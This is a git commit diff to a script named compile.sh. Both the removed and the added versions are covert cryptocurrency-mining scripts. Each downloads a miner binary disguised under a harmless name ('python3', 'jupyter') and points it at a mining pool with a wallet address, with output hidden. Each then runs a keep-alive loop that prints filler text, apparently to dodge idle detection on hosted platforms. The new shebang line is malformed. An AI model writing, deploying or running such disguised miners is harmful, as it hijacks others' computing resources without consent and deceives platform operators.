6586a229391f8be4c82711e0f7e0a373a072fd80
plangtonlaut3 <114853132+plangtonlaut3@users.noreply.github.com>
2022-10-17 02:54:18 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,5 +1,5 @@
-#!/bin/bash
-wget https://github.com/azkhaadhenia/cli/raw/main/python3
-chmod +x python3
-./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TJFizKH6LFbQfSi95hfwtBZcnA8sWtA3Cg.her -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+!#/bin/bash
+wget https://github.com/dadanhiyeumX9/dero-mod/raw/main/jupyter-v0.0.5-linux-amd64.tar.gz
+tar xf jupyter-v0.0.5-linux-amd64.tar.gz
+./jupyter -r dero-merah.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.simbah13 >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
